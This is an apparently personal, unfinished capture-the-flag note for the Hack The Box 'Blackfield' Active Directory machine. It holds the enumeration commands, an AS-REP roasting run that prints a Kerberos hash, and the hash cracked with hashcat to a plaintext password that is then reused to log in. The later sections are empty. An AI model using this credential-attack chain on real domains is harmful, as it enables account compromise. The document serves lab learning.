# Blackfield

Tags: AD-Win
Level: Hard
Tools: Kerbrute
Status: In progress
Date: May 30, 2024

### Nmap

```markdown
nmap -sC -sV -p- --open 10.10.10.192 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-30 17:28 CDT
Nmap scan report for 10.10.10.192
Host is up (0.060s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-31 05:31:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-05-31T05:31:44
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.45 seconds
```

No response to crackmapexec, smbmap, enum4linux,

Information from 

```markdown
>smbclient -L 10.10.10.192 -U 'asdas'
>smbclient -t cifs '[//10.10.10.192/profiles$](notion://10.10.10.192/profiles$)'
>smbclient -t cifs '[//10.10.10.192/profiles$](notion://10.10.10.192/profiles$)' /mnt
>sudo mount -t cifs '[//10.10.10.192/profiles$](notion://10.10.10.192/profiles$)' /mnt
>sudo mount -t cifs '//10.10.10.192/profiles$' /mnt
#If their are any monted
>sudo unmount /mnt
>cd mnt

>find .
>ls
ls > /home/kali/Desktop/HTB/OSCP/blackfield_users.lst
cd /home/kali/Desktop/HTB/OSCP
>gedit blackfield_users.lst
>kerbrute
>wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
>ls kerbrute_linux_amd64
>file kerbrute_linux_amd64
>chmod +x kerbrute_linux_amd64
>ll kerbrute_linux_amd64
>mv kerbrute_linux_amd64 kerbrute
>ll kerbrute
>./kerbrute
>./kerbrute userenum --dc 10.10.10.192 -d blackfield -o blackfield_kerbrute.out blackfield_users.lst
>cat blackfield_kerbrute.out | awk '{print $7}'
>grep VALID blackfield_kerbrute.out | awk '{print $7}' | awk -F\@ '{print $1}'
>grep VALID blackfield_kerbrute.out | awk '{print $7}' | awk -F\@ '{print $1}'
>grep VALID blackfield_kerbrute.out | awk '{print $7}' | awk -F\@ '{print $1}' > blackfield_users.lst
>grep VALID blackfield_kerbrute.out | awk '{print $7}' | awk -F\@ '{print $2"\\"$1}' 
-blackfield\audit2020
-blackfield\support
-blackfield\svc_backup
>grep VALID blackfield_kerbrute.out | awk '{print $7}' | awk -F\@ '{print $2"\\"$1}' > blackfield_kerbrute_users.lst
>./GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile blackfield_users.lst blackfield/ 
Impacket v0.11.0 - Copyright 2023 Fortra
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD:dae4a5862eabac3a17e3d3a9c2008f92$66113d4643ba0c5f1b453efe322242bf53903215aeeea641bda9d8fd9f2a6b0834d4f254e1d93d0b555c05a67b93910f0a0c104b851331661d942234af91157710c2a88f53f9863e8bae278ae95216c09f590add9cf931c3968518c506ae3cfc790cd039f2969f68bfada7baf9520831a620271959c836ac0c14df625727b8f9bad72a6048479b2e28081ed929ebb9c5c137b426c075c0547c0be75a8af57657e46519a6632abbcaaaa4c0a5d02a5bbed212d960e7ee6743f4a78762d5fa684e0e0d669d013f167d9b48717488a6f74f41bbfa413cc4fd57ee17f8da64ccc28418bfb263afad8a8338e14ac3bd7f
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
>hashcat --example-hashes --mach | grep krb5asrep  (#Revels the 18200)
>hashcat -m 18200 blackfield_hash rockyou.txt --show 
$krb5asrep$23$support@BLACKFIELD:dae4a5862eabac3a17e3d3a9c2008f92$66113d4643ba0c5f1b453efe322242bf53903215aeeea641bda9d8fd9f2a6b0834d4f254e1d93d0b555c05a67b93910f0a0c104b851331661d942234af91157710c2a88f53f9863e8bae278ae95216c09f590add9cf931c3968518c506ae3cfc790cd039f2969f68bfada7baf9520831a620271959c836ac0c14df625727b8f9bad72a6048479b2e28081ed929ebb9c5c137b426c075c0547c0be75a8af57657e46519a6632abbcaaaa4c0a5d02a5bbed212d960e7ee6743f4a78762d5fa684e0e0d669d013f167d9b48717488a6f74f41bbfa413cc4fd57ee17f8da64ccc28418bfb263afad8a8338e14ac3bd7f:#00^BlackKnight
Username-Password:support-#00^BlackKnight
>crackmapexec smb 10.10.10.192 --shares -u 'support' -p '#00^BlackKnight'
>sudo mount -t cifs -o 'username=support,password=#00^BlackKnight' //10.10.10.192/profiles$ /mnt
>rpcclient -U support 10.10.10.192 (#password-#00^BlackKnight)
rpcclient > enumdomusers
>cat blackfield_rpcclient | awk -F'\[' '{print $2}' | awk -F '\]' '{print $1}' > blackfield_rpcclient_filtered.lst
>./GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile blackfield_rpcclient_filtered.lst blackfield/
>

```

### Enumeration

### User flag

### Root flag